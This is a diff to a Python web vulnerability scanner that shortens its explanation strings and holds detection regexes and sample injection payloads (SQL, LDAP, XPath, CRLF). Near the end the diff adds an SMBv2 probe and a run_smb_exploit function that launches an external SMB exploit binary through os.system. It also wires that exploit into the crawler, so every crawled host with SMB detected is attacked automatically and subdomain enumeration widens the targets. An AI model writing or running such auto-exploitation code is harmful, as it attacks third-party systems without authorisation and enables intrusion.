@@ -22,16 +22,6 @@ import numpy as np
 import socket
 import ssl
 
-"""
-Adding additional vulnerability patterns and subdomain enumeration capabilities
-as part of the improvements. Vulnerability analysis comments included inline.
-
-IDOR (Insecure Direct Object Reference) can allow unauthorized users to access objects
-by providing or manipulating object references (IDs) directly, bypassing authorization.
-Exposed Jenkins can disclose administrative consoles. Race condition references can show
-timing-based vulnerabilities. 
-"""
-
 try:
     from sklearn.feature_extraction.text import TfidfVectorizer
     from sklearn.linear_model import LogisticRegression
@@ -77,11 +67,6 @@ XSS_REGEXES = [
     "<script src=['\"]http://[^>]*?>"
 ]
 
-"""
-Added IDOR, Exposed Jenkins, Race Condition checks, etc. 
-These checks can reveal direct object references, Jenkins console leaks, 
-and suspicious patterns that indicate race conditions or concurrency flaws.
-"""
 VULN_PATTERNS = {
     "SQL Error": re.compile(r"(sql\s*exception|sql\s*syntax|warning.*mysql.*|unclosed\s*quotation\s*mark|microsoft\s*ole\s*db\s*provider|odbc\s*sql\s*server\s*driver|pg_query\()",re.IGNORECASE|re.DOTALL),
     "SQL Injection": re.compile(r"(\bunion\s+select\s|\bselect\s+\*\s+from\s|\bsleep\(|\b'or\s+1=1\b|\b'or\s+'a'='a\b|--|#|xp_cmdshell|information_schema)",re.IGNORECASE|re.DOTALL),
@@ -137,66 +122,66 @@ HEADER_PATTERNS = {
 }
 
 VULN_EXPLANATIONS = {
-    "SQL Error":"Server returned detailed database error messages revealing structure or SQL syntax issues.",
-    "SQL Injection":"Possible direct injection into SQL queries, risking data exfiltration or destructive queries.",
-    "XSS":"Reflected, stored, or DOM-based cross-site scripting found, potentially allowing script execution in the client.",
-    "Directory Listing":"Server exposes directory contents, allowing enumeration or data leakage.",
-    "File Inclusion":"Local or remote file inclusion may allow reading of sensitive files or remote code execution.",
-    "Server Error":"HTTP 500 or similar errors indicating unstable or unhandled exceptions on the server side.",
-    "Shellshock":"Vulnerable to Bash environment variable injection.",
-    "Remote Code Execution":"Code or commands can be executed on the remote server.",
-    "LFI/RFI":"Local or Remote File Inclusion vulnerability references in the response or parameters.",
-    "SSRF":"Potential server-side request forgery, allowing requests to internal services.",
-    "Path Traversal":"Traversal attempt or reference that may allow accessing arbitrary files on the server.",
-    "Command Injection":"Executing OS commands via user input injection.",
-    "WordPress Leak":"Indicates WordPress installation leakage, might reveal version or sensitive WP paths.",
-    "Java Error":"Exposed Java stack trace or error logs that can reveal code structure.",
-    "Open Redirect":"Redirecting users to untrusted external domains via user input.",
-    "Deserialization":"Data suggests unsafe object deserialization paths, leading to code execution.",
-    "XXE":"XML external entity usage, which can leak files or execute SSRF.",
-    "File Upload":"Server-side file upload point can introduce malicious files if not secured.",
-    "Prototype Pollution":"Manipulating JS object prototypes can compromise logic or cause RCE in some cases.",
-    "NoSQL Injection":"Mongo-like or other NoSQL injection references found in the payload or response.",
-    "Exposed Git Directory":".git folder or config data exposed, revealing code history or credentials.",
-    "Potential Secrets":"Possible keys/tokens in the response that could be sensitive.",
-    "JWT Token Leak":"JSON Web Token is exposed, risking session hijack.",
-    "ETC Shadow Leak":"Direct mention or reading of /etc/shadow indicates severe file disclosure.",
-    "Missing Security Headers":"Important headers not present; can open XSS, clickjacking, or MITM risk.",
-    "Outdated or Insecure Server":"Server version is known to have vulnerabilities.",
-    "Cookies lack 'Secure'/'HttpOnly'":"Cookies do not have secure or HTTPOnly flags, raising session hijack risk.",
-    "Suspicious param name:":"Parameter name strongly suggests command, shell, or token usage.",
-    "Suspicious param value in":"Parameter value suggests injection attempts or malicious content.",
-    "Form uses GET with password/hidden":"Sensitive data sent in GET query, risking exposure in logs or referrers.",
-    "Suspicious form fields (cmd/shell/token)":"Potential malicious or elevated function fields in forms.",
-    "POST form without CSRF token":"Form lacks CSRF protection token, vulnerable to cross-site request forgery.",
-    "Service Disruption":"Repeated 5xx or timeouts indicating server instability or overload.",
-    "Possible Password Leak":"A direct 'password=...' mention in the response or code snippet.",
-    "CC Leak":"Raw credit card number patterns in the output, indicating possible data leak.",
-    "CRLF Injection":"HTTP header injection or response splitting possibility.",
-    "HTTP Request Smuggling":"Conflicting Content-Length/Transfer-Encoding likely enabling request smuggling.",
-    "LDAP Injection":"Injection attempt for LDAP queries.",
-    "XPath Injection":"Injection attempt for XPath queries.",
-    "Exposed S3 Bucket":"Open or visible AWS S3 bucket references.",
-    "Exposed Azure Blob":"Open or visible Azure blob container references.",
-    "Exposed K8s Secrets":"References to Kubernetes config or tokens.",
-    "npm Token":"npm private access token leaked.",
-    "GraphQL Injection":"Possible injection or misconfiguration in GraphQL queries.",
-    "Regex DOS":"Potential catastrophic backtracking in a regex leading to DoS.",
-    "CORS Misconfiguration":"Server sets overly broad Access-Control-Allow-Origin or credentials incorrectly.",
-    "Insecure HTTP Methods":"Server allows potentially risky HTTP methods like PUT, DELETE, or TRACE.",
+    "SQL Error":"Server returned detailed database error messages.",
+    "SQL Injection":"Possible direct injection into SQL queries.",
+    "XSS":"Cross-site scripting found.",
+    "Directory Listing":"Server exposes directory contents.",
+    "File Inclusion":"Local/remote file inclusion references.",
+    "Server Error":"5xx errors or unhandled exceptions.",
+    "Shellshock":"Bash environment variable injection.",
+    "Remote Code Execution":"Code/commands can be executed on the server.",
+    "LFI/RFI":"Local or remote file inclusion references.",
+    "SSRF":"Possible server-side request forgery.",
+    "Path Traversal":"Traversal references to access files.",
+    "Command Injection":"Executing OS commands from input.",
+    "WordPress Leak":"WordPress paths or info leaked.",
+    "Java Error":"Exposed Java stacktrace or logs.",
+    "Open Redirect":"Redirecting to untrusted external domain.",
+    "Deserialization":"Unsafe object deserialization references.",
+    "XXE":"XML external entity usage.",
+    "File Upload":"File upload form or references found.",
+    "Prototype Pollution":"Potential prototype pollution in JS objects.",
+    "NoSQL Injection":"Mongo/NoSQL injection attempt references.",
+    "Exposed Git Directory":".git folder or config exposed.",
+    "Potential Secrets":"Possible keys or tokens found.",
+    "JWT Token Leak":"JSON Web Token exposed.",
+    "ETC Shadow Leak":"/etc/shadow mention found.",
+    "Missing Security Headers":"Important headers not present.",
+    "Outdated or Insecure Server":"Server version with known vulns.",
+    "Cookies lack 'Secure'/'HttpOnly'":"Cookie flags missing.",
+    "Suspicious param name:":"Params suggesting commands or tokens.",
+    "Suspicious param value in":"Possible injection in param values.",
+    "Form uses GET with password/hidden":"Sensitive data sent via GET.",
+    "Suspicious form fields (cmd/shell/token)":"Suspicious form input names.",
+    "POST form without CSRF token":"Form lacks anti-CSRF tokens.",
+    "Service Disruption":"5xx or exceptions on repeated requests.",
+    "Possible Password Leak":"Direct 'password=...' mention.",
+    "CC Leak":"Credit card number patterns.",
+    "CRLF Injection":"HTTP header injection possibility.",
+    "HTTP Request Smuggling":"Content-Length vs TE conflict.",
+    "LDAP Injection":"Injection attempt in LDAP query.",
+    "XPath Injection":"Injection attempt in XPath query.",
+    "Exposed S3 Bucket":"Open S3 bucket references.",
+    "Exposed Azure Blob":"Open Azure blob references.",
+    "Exposed K8s Secrets":"K8s config or secret references.",
+    "npm Token":"npm access token exposed.",
+    "GraphQL Injection":"Injection or misconfig in GraphQL queries.",
+    "Regex DOS":"Potential catastrophic backtracking.",
+    "CORS Misconfiguration":"Overly broad Access-Control-Allow-Origin.",
+    "Insecure HTTP Methods":"Allows PUT, DELETE, or TRACE.",
     "No explanation":"No explanation",
-    "Potential WAF":"Site might be behind or protected by a WAF, or the response indicates WAF presence.",
-    "ChromeDriver Error":"Error occurred while using ChromeDriver for scanning",
-    "Exposed .env File":"Potentially exposed .env or backup .env file with sensitive info.",
-    "Exposed Environment Variable":"Possible environment variable or secret in the response.",
-    "Default Credentials":"Found default credentials patterns indicating insecure configuration.",
-    "Email Leak":"Possible email address patterns found in the response.",
-    "Phone Number Leak":"Possible phone number patterns found in the response.",
-    "Possible SSN Leak":"Possible Social Security Number patterns found in the response.",
-    "SSL Certificate Issue":"Possible issues with the certificate, such as expiration, invalid domain, or self-signed certificate that might not be trusted.",
-    "Insecure Direct Object Reference (IDOR)":"Allows unauthorized access or manipulation of objects by modifying direct references (IDs).",
-    "Exposed Jenkins Console":"Possible open Jenkins manage/script console or headers indicating Jenkins environment.",
-    "Race Condition":"Potential concurrency/race scenario references that might lead to inconsistent state or exploit."
+    "Potential WAF":"WAF presence indicated.",
+    "ChromeDriver Error":"Error using ChromeDriver",
+    "Exposed .env File":"Possible .env file exposure.",
+    "Exposed Environment Variable":"Env var or secrets in the response.",
+    "Default Credentials":"Found default creds patterns.",
+    "Email Leak":"Possible email address found.",
+    "Phone Number Leak":"Possible phone number found.",
+    "Possible SSN Leak":"Possible SSN pattern found.",
+    "SSL Certificate Issue":"Certificate problem.",
+    "Insecure Direct Object Reference (IDOR)":"Access to objects by ID references.",
+    "Exposed Jenkins Console":"Open Jenkins console or headers.",
+    "Race Condition":"Possible concurrency or timing references."
 }
 
 def label_entry(label,tactic,snippet,confidence=1.0):
@@ -241,8 +226,8 @@ MULTI_VULN_SAMPLES = {
     "CC Leak":(["4111 1111 1111 1111"],["1111"]),
     "CRLF Injection":(["%0d%0a","\\r\\n"],["normal line break"]),
     "HTTP Request Smuggling":(["transfer-encoding: chunked\r\ncontent-length: 100"],["normal headers"]),
-    "LDAP Injection":(["(cn=*)","|(objectClass=*)","(uid=*)"],["(cn=John)","(&(objectClass=person)(cn=John))"]),
-    "XPath Injection":(["/users/user","text()='secret'","[contains(text(),'test')]"],["normal xml","legitimate xpath"]),
+    "LDAP Injection":(["(cn=*)","|(objectClass=*)","(uid=*)"],["(cn=John)"]),
+    "XPath Injection":(["/users/user","text()='secret'","[contains(text(),'test')]"],["normal xml"]),
     "Exposed S3 Bucket":(["mybucket.s3.amazonaws.com","bucket.s3.amazonaws.com"],["normal usage"]),
     "Exposed Azure Blob":([".blob.core.windows.net"],["safe azure usage"]),
     "Exposed K8s Secrets":(["kubeconfig","k8s_secret","kubeadm token"],["kube cluster safe"]),
@@ -260,10 +245,6 @@ CVE_DB = {
     "nginx/1.10.3":"Possible CVEs: CVE-2017-7529, CVE-2019-20372"
 }
 
-"""
-New function to do simple subdomain enumeration for domain expansions.
-This further improves scanning capabilities by searching potential subdomains.
-"""
 def find_subdomains(domain, subdomains_list=["www","dev","test","admin"]):
     found_subdomains = []
     for sub in subdomains_list:
@@ -680,7 +661,8 @@ def check_ssl_certificate(url):
                 if subject == issuer:
                     results.append(label_entry("SSL Certificate Issue","ssl-check","Self-signed certificate"))
     except Exception as e:
-        results.append(label_entry("SSL Certificate Issue","ssl-check",f"Error verifying certificate: {str(e)}"))
+        error_details = str(e)
+        results.append(label_entry("SSL Certificate Issue","ssl-check",f"Error verifying certificate: {error_details}"))
     return results
 
 def scan_target(url):
@@ -871,10 +853,23 @@ def scan_with_chromedriver(url):
         error_details = traceback.format_exc()
         return {"url":url,"error":f"{str(e)}\nTraceback:\n{error_details}","data":"","found_flags":[]}
 
-"""
-Priority BFS improved to also do a quick subdomain scan at each domain level 
-to expand potential target coverage drastically.
-"""
+def check_smb_v2(host):
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(2)
+            s.connect((host,445))
+            s.sendall(b"\x00\x00\x00\x54\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+            data = s.recv(1024)
+            if b"SMB2" in data or b"\xfeSMB" in data:
+                return True
+    except:
+        pass
+    return False
+
+def run_smb_exploit(server_ip, server_port="445"):
+    cmd = f"./smb2_pipe_exec_client {server_ip} {server_port}"
+    os.system(cmd)
+
 def priority_bfs_crawl_and_scan(starts,max_depth=20):
     visited = set()
     q = []
@@ -894,14 +889,20 @@ def priority_bfs_crawl_and_scan(starts,max_depth=20):
         print(f"PriorityBFS Depth: {d}")
         print(f"Full URL: {u}")
         print("Details: scanning target, scanning with chromedriver, checking SSL, extracting links, enumerating subdomains.")
+        domain_part = urllib.parse.urlsplit(u).netloc
+        host_ip = domain_part.split(":")[0]
+        if host_ip:
+            smb_result = check_smb_v2(host_ip)
+            if smb_result:
+                print(f"SMBv2 detected on {host_ip}")
+                run_smb_exploit(host_ip,"445")
+            else:
+                print(f"SMBv2 not detected on {host_ip}")
         if u in visited:
             continue
         if d>max_depth:
             break
         visited.add(u)
-
-        # Subdomain enumeration
-        domain_part = urllib.parse.urlsplit(u).netloc
         sub_enumeration = find_subdomains(domain_part)
         for subd in sub_enumeration:
             potential_url = f"http://{subd}"
